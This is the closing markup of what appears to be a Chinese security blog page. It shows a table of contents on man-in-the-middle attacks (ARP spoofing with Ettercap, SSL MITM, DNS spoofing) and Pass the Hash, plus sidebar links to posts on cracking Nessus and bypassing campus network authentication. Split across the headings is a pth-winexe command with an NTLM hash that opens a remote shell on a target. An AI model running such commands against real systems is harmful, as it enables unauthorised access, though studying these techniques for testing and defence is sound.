href="#%E2%80%93-D-%E5%90%8E%E5%8F%B0%E6%A8%A1%E5%BC%8F"><span class="toc-number">22.47.1.0.4.</span> <span class="toc-text">– -D 后台模式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E7%9B%AE%E6%A0%87"><span class="toc-number">22.47.2.</span> <span class="toc-text">指定目标</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB-8"><span class="toc-number">22.48.</span> <span class="toc-text">中间人攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90"><span class="toc-number">22.48.1.</span> <span class="toc-text">权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARP-MITM"><span class="toc-number">22.49.</span> <span class="toc-text">ARP MITM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E6%A8%A1%E5%BC%8F"><span class="toc-number">22.49.1.</span> <span class="toc-text">字符模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2"><span class="toc-number">22.49.2.</span> <span class="toc-text">图形界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSL-MITM"><span class="toc-number">22.49.3.</span> <span class="toc-text">SSL MITM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E6%AC%BA%E9%AA%97"><span class="toc-number">22.49.4.</span> <span class="toc-text">DNS欺骗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARP-MITM-1"><span class="toc-number">22.50.</span> <span class="toc-text">ARP MITM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ettercap-%E6%97%A5%E5%BF%97%E6%9F%A5%E7%9C%8B"><span class="toc-number">22.50.1.</span> <span class="toc-text">Ettercap 日志查看</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARP-MITM-2"><span class="toc-number">22.51.</span> <span class="toc-text">ARP MITM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Filter"><span class="toc-number">22.51.1.</span> <span class="toc-text">Filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-2-xx-x2F-SSH-1-99-x2F-SSH-1-51"><span class="toc-number">22.51.2.</span> <span class="toc-text">SSH-2.xx &#x2F; SSH-1.99 &#x2F; SSH-1.51</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%BF%E6%8D%A2HTTP%E5%86%85%E5%AE%B9"><span class="toc-number">22.51.3.</span> <span class="toc-text">替换HTTP内容</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB-9"><span class="toc-number">22.52.</span> <span class="toc-text">中间人攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ICMP"><span class="toc-number">22.52.1.</span> <span class="toc-text">ICMP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DHCP"><span class="toc-number">22.52.2.</span> <span class="toc-text">DHCP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Port"><span class="toc-number">22.52.3.</span> <span class="toc-text">Port</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ndp"><span class="toc-number">22.52.4.</span> <span class="toc-text">Ndp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-the-Hash-PTH"><span class="toc-number">22.53.</span> <span class="toc-text">Pass the Hash (PTH)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E8%80%97%E8%B4%B9%E6%97%B6%E9%97%B4%E8%B5%84%E6%BA%90%E5%B7%A8%E5%A4%A7"><span class="toc-number">22.53.1.</span> <span class="toc-text">密码破解耗费时间资源巨大</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%AF%86%E6%96%87%E6%8F%90%E4%BA%A4%E7%BB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9B%B4%E6%8E%A5%E5%AE%8C%E6%88%90%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81"><span class="toc-number">22.53.2.</span> <span class="toc-text">使用密文提交给服务器直接完成身份认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-x2F-LM%E6%98%AF%E6%B2%A1%E6%9C%89%E5%8A%A0%E7%9B%90%E7%9A%84%E9%9D%99%E6%80%81HASH%E5%AF%86%E6%96%87"><span class="toc-number">22.53.3.</span> <span class="toc-text">NTLM&#x2F;LM是没有加盐的静态HASH密文</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%81%E4%B8%9A%E4%B8%AD%E4%BD%BF%E7%94%A8ghost%E7%AD%89%E5%B7%A5%E5%85%B7%E5%85%8B%E9%9A%86%E5%AE%89%E8%A3%85%E7%B3%BB%E7%BB%9F"><span class="toc-number">22.53.4.</span> <span class="toc-text">企业中使用ghost等工具克隆安装系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pth-winexe-U"><span class="toc-number">22.53.5.</span> <span class="toc-text">pth-winexe -U</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#w7-aad3b435b51404eeaad3b435b51404ee-ed1bfaeb3063"><span class="toc-number">22.53.6.</span> <span class="toc-text">w7%aad3b435b51404eeaad3b435b51404ee:ed1bfaeb3063</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#716ab7fe2a11faf126d8-x2F-x2F-1-1-1-1-cmd"><span class="toc-number">22.53.7.</span> <span class="toc-text">716ab7fe2a11faf126d8 &#x2F;&#x2F;1.1.1.1 cmd</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/08/21/%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF%E4%B8%8E%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%96%87%E5%8C%96%E5%9F%BA%E7%A1%80/" title="信息技术与计算机文化基础"><img src="https://pic3.zhimg.com/v2-fbb002ec83393f1b87a55cfb69c864db_r.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="信息技术与计算机文化基础"/></a><div class="content"><a class="title" href="/2022/08/21/%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF%E4%B8%8E%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%96%87%E5%8C%96%E5%9F%BA%E7%A1%80/" title="信息技术与计算机文化基础">信息技术与计算机文化基础</a><time datetime="2022-08-21T13:58:00.000Z" title="发表于 2022-08-21 21:58:00">2022-08-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/08/02/%E5%BF%85%E8%83%8C%E5%8F%A4%E8%AF%97%E6%96%87%E6%B1%87%E6%80%BB/" title="必背古诗文汇总"><img src="https://n.sinaimg.cn/sinakd20116/600/w1920h1080/20201013/99db-kakmcxe5072956.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="必背古诗文汇总"/></a><div class="content"><a class="title" href="/2022/08/02/%E5%BF%85%E8%83%8C%E5%8F%A4%E8%AF%97%E6%96%87%E6%B1%87%E6%80%BB/" title="必背古诗文汇总">必背古诗文汇总</a><time datetime="2022-08-02T02:42:00.000Z" title="发表于 2022-08-02 10:42:00">2022-08-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/13/Untitled/" title="修改mac地址绕过强制门户机制（绕过校园网认证）"><img src="https://pic3.zhimg.com/v2-fbb002ec83393f1b87a55cfb69c864db_r.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="修改mac地址绕过强制门户机制（绕过校园网认证）"/></a><div class="content"><a class="title" href="/2022/06/13/Untitled/" title="修改mac地址绕过强制门户机制（绕过校园网认证）">修改mac地址绕过强制门户机制（绕过校园网认证）</a><time datetime="2022-06-13T00:40:00.000Z" title="发表于 2022-06-13 08:40:00">2022-06-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/12/%E7%9B%B4%E6%8E%A5%E9%83%A8%E7%BD%B2-vCenter-Server-%EF%BC%88%E5%9F%BA%E4%BA%8E%E8%87%AA%E5%B8%A6Linux%EF%BC%89/" title="直接部署 vCenter Server （基于自带Linux）"><img src="https://pic2.zhimg.com/3708cb76ff8597fa6532a1ac9c924b2d_r.jpg?source=1940ef5c" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="直接部署 vCenter Server （基于自带Linux）"/></a><div class="content"><a class="title" href="/2022/06/12/%E7%9B%B4%E6%8E%A5%E9%83%A8%E7%BD%B2-vCenter-Server-%EF%BC%88%E5%9F%BA%E4%BA%8E%E8%87%AA%E5%B8%A6Linux%EF%BC%89/" title="直接部署 vCenter Server （基于自带Linux）">直接部署 vCenter Server （基于自带Linux）</a><time datetime="2022-06-12T03:02:00.000Z" title="发表于 2022-06-12 11:02:00">2022-06-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/10/Nessus-%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/" title="Nessus 安装破解"><img src="https://pic3.zhimg.com/v2-fbb002ec83393f1b87a55cfb69c864db_r.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nessus 安装破解"/></a><div class="content"><a class="title" href="/2022/06/10/Nessus-%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/" title="Nessus 安装破解">Nessus 安装破解</a><time datetime="2022-06-10T11:02:00.000Z" title="发表于 2022-06-10 19:02:00">2022-06-10</time></div></div></div></div></div></div></main><footer id="footer" style="background: flase"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 张学松</div><div class="footer_custom_text"><div><i class="fa-solid fa-building-shield">很高兴认识你</i></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script src="https://myhkw.cn/player/js/jquery.min.js" type="text/javascript"></script><script src="https://myhkw.cn/api/player/164921607980" id="myhk" key="164921607980" m="1"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>